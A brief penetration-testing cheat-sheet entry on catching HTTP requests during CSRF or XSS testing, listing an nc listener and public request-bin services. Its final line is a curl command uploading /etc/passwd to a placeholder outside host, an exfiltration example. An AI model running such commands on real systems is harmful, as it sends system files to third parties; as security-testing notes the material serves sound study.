# Request Grabber

<div class="row row-cols-lg-2"><div>

During pentesting activies, we may want to catch HTTP requests, such as during a CSRF attack or a XSS attack.

If our machine is network accessible, we can use `nc`:

```shell!
$ nc -lnvp PORT
<send request to YOUR_PUBLIC_IP:PORT>
```

Otherwise, we may use online public solutions.
</div><div>

For instance, we can use API Testing Platforms:

* [requestbin](https://public.requestbin.com/r/) <small>(HTTP 🌍)</small>
* [postbin](https://www.toptal.com/developers/postbin/) <small>(HTTP 🌍)</small>
* [ngrok](https://ngrok.com/) <small>(HTTP 🌍 and TCP ⭐, account required 🪦)</small>
* [requestinspector](https://requestinspector.com/) <small>(HTTP 🌍)</small>
* ...

```ps
$ curl http://XXX/xxxxxx -F "data=@/etc/passwd"
```
</div></div>